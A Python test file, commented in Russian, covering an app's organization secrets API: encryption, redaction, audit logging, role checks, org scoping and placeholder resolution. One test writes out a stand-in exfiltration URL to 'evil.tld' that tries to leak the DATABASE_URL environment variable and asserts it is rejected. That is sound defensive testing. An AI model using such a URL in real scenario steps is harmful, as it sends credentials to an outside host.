import pytest
from sqlalchemy import select

from app.models import AuditLog, OrgSecret
from app.services.checks import redact_secrets, resolve_placeholders
from app.services.secrets import load_org_secrets


def register_and_login(client, email):
    payload = {"email": email, "password": "password123"}
    client.post("/api/v1/auth/register", json=payload)
    token = client.post("/api/v1/auth/login", json=payload).json()["access_token"]
    return {"Authorization": f"Bearer {token}"}


def test_secret_value_is_never_returned(client, auth_headers):
    created = client.put(
        "/api/v1/secrets/SHOP_PASSWORD",
        json={"name": "SHOP_PASSWORD", "value": "s3cret-value"},
        headers=auth_headers,
    )
    assert created.status_code == 200
    assert created.json()["name"] == "SHOP_PASSWORD"
    assert "s3cret-value" not in created.text

    listed = client.get("/api/v1/secrets", headers=auth_headers)
    assert listed.status_code == 200
    assert [item["name"] for item in listed.json()] == ["SHOP_PASSWORD"]
    assert "s3cret-value" not in listed.text


def test_secret_stored_encrypted_and_decrypts_back(client, auth_headers, db_session_factory):
    client.put(
        "/api/v1/secrets/API_TOKEN",
        json={"name": "API_TOKEN", "value": "plain-token"},
        headers=auth_headers,
    )
    with db_session_factory() as db:
        secret = db.scalar(select(OrgSecret).where(OrgSecret.name == "API_TOKEN"))
        assert secret is not None
        # в БД лежит шифротекст, не исходное значение
        assert "plain-token" not in secret.value_secret
        assert load_org_secrets(db, secret.org_id) == {"API_TOKEN": "plain-token"}


def test_put_replaces_value_without_duplicating(client, auth_headers, db_session_factory):
    for value in ("first", "second"):
        client.put("/api/v1/secrets/TOKEN", json={"name": "TOKEN", "value": value}, headers=auth_headers)

    with db_session_factory() as db:
        rows = db.scalars(select(OrgSecret).where(OrgSecret.name == "TOKEN")).all()
        assert len(rows) == 1
        assert load_org_secrets(db, rows[0].org_id) == {"TOKEN": "second"}


def test_secret_name_must_match_placeholder_syntax(client, auth_headers):
    bad = client.put(
        "/api/v1/secrets/lower-case", json={"name": "lower-case", "value": "x"}, headers=auth_headers
    )
    assert bad.status_code == 422

    mismatch = client.put(
        "/api/v1/secrets/ONE", json={"name": "TWO", "value": "x"}, headers=auth_headers
    )
    assert mismatch.status_code == 400


def test_delete_removes_secret(client, auth_headers, db_session_factory):
    client.put("/api/v1/secrets/GONE", json={"name": "GONE", "value": "x"}, headers=auth_headers)
    assert client.delete("/api/v1/secrets/GONE", headers=auth_headers).status_code == 204
    assert client.delete("/api/v1/secrets/GONE", headers=auth_headers).status_code == 404

    with db_session_factory() as db:
        assert db.scalar(select(OrgSecret).where(OrgSecret.name == "GONE")) is None


def test_audit_records_name_but_not_value(client, auth_headers, db_session_factory):
    client.put(
        "/api/v1/secrets/AUDITED", json={"name": "AUDITED", "value": "must-not-leak"}, headers=auth_headers
    )
    with db_session_factory() as db:
        entry = db.scalar(select(AuditLog).where(AuditLog.action == "secret.upsert"))
        assert entry is not None
        assert entry.entity_id == "AUDITED"
        assert "must-not-leak" not in str(entry.payload)


def test_member_cannot_write_secrets(client, auth_headers, db_session_factory):
    from app.models import OrgMember, User

    member_headers = register_and_login(client, "member@example.com")
    with db_session_factory() as db:
        user = db.scalar(select(User).where(User.email == "member@example.com"))
        membership = db.scalar(select(OrgMember).where(OrgMember.user_id == user.id))
        assert membership.role == "member"

    forbidden = client.put(
        "/api/v1/secrets/NOPE", json={"name": "NOPE", "value": "x"}, headers=member_headers
    )
    assert forbidden.status_code == 403
    assert client.delete("/api/v1/secrets/NOPE", headers=member_headers).status_code == 403

    # читать имена участник может — это не секретные данные
    assert client.get("/api/v1/secrets", headers=auth_headers).status_code == 200
    assert client.get("/api/v1/secrets", headers=member_headers).status_code == 200


def test_secrets_are_scoped_to_organization(client, db_session_factory, monkeypatch):
    from app.core.config import get_settings

    monkeypatch.setattr(get_settings(), "deployment_mode", "enterprise")

    owner = register_and_login(client, "owner@example.com")
    client.put("/api/v1/secrets/SHARED", json={"name": "SHARED", "value": "org-one"}, headers=owner)

    # вторая организация того же пользователя не видит секрет первой
    created = client.post("/api/v1/orgs", json={"name": "Second", "slug": "second"}, headers=owner)
    assert created.status_code == 201
    switched = client.post(f"/api/v1/orgs/{created.json()['id']}/switch", headers=owner)
    second_headers = {"Authorization": f"Bearer {switched.json()['access_token']}"}

    assert client.get("/api/v1/secrets", headers=second_headers).json() == []

    with db_session_factory() as db:
        assert load_org_secrets(db, created.json()["id"]) == {}


# --- подстановка в шаги сценария ---


def test_placeholders_resolve_from_workspace_secrets_only(monkeypatch):
    monkeypatch.setenv("DATABASE_URL", "postgresql://user:password@postgres/monitor")

    step = {"action": "goto", "url": "https://shop.example/login?token=${SHOP_TOKEN}"}
    assert resolve_placeholders(step, {"SHOP_TOKEN": "abc"})["url"] == "https://shop.example/login?token=abc"

    # переменная окружения воркера остаётся невидимой
    with pytest.raises(ValueError, match="secret 'DATABASE_URL' is not defined"):
        resolve_placeholders({"action": "goto", "url": "https://evil.tld/?x=${DATABASE_URL}"}, {"SHOP_TOKEN": "abc"})


def test_redact_secrets_hides_substituted_values():
    secrets = {"SHOP_TOKEN": "abc123", "EMPTY": ""}
    text = "Timeout on https://shop.example/login?token=abc123"
    assert redact_secrets(text, secrets) == "Timeout on https://shop.example/login?token=***"
    # пустое значение не должно превращать каждый символ в маску
    assert redact_secrets("plain", secrets) == "plain"
